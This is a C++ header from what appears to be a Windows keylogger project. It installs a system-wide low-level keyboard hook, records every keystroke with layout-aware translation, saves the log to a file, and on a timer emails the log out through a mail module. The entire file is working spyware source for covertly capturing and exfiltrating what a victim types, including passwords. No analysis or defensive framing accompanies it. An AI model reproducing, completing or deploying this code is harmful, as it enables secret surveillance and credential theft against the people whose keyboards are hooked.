#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog{ "" };

void TimerSendMail()
{
    if (keylog.empty())
        return;

    std::string last_file{ IO::WriteLog(keylog) };

    if (last_file.empty())
    {
        Helper::WriteAppLog("File creation was not succesfull. Keylog '" + keylog + "'");
        return;
    }

    int mail_stat = Mail::SendMail("Log [" + last_file + "]",
        "Hi :)\n The file has been attached to this mail.\n For testing: " + keylog,
        IO::GetOurPath(true) + last_file);

    if (mail_stat != 7)
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(mail_stat));
    else
        keylog = "";
}

Timer MailTimer{ TimerSendMail, 500 * 60, Timer::Infinite };

HHOOK eHook = nullptr;

LRESULT __stdcall OurKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode < 0)
        CallNextHookEx(eHook, nCode, wParam, lParam);

    KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    {
        if (kbs->vkCode < 0x41 || kbs->vkCode > 0x5A)
        {
            keylog += Keys::KEYS[kbs->vkCode].Name;
        }
        else
        {
            unsigned char keyboardState[256];
            for (int i = 0; i < 256; ++i)
                keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));

            wchar_t wbuffer[3] = { 0 };

            int result = ToUnicodeEx(
                kbs->vkCode,
                kbs->scanCode,
                keyboardState,
                wbuffer,
                sizeof(wbuffer) / sizeof(wchar_t),
                0,
                GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));

            if (result > 0)
            {
                char buffer[5] = { 0 };
                WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
                keylog += buffer;
            }
        }

        if (kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }
    else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL 
            || key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT 
            || key == VK_MENU || key == VK_LMENU || key == VK_RMENU 
            || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wParam, lParam);
}

bool InstallHook()
{
    IO::MKDir(IO::GetOurPath(true));
    Helper::WriteAppLog("Hook Started... Timer Started");
    MailTimer.Start(true);
    
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(OurKeyboardProc), GetModuleHandle(nullptr), 0);

    return eHook == nullptr;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = nullptr;
    return static_cast<bool>(b);
}

bool IsHooked()
{
    return eHook == nullptr;
}

#endif // !KEYHOOK_H
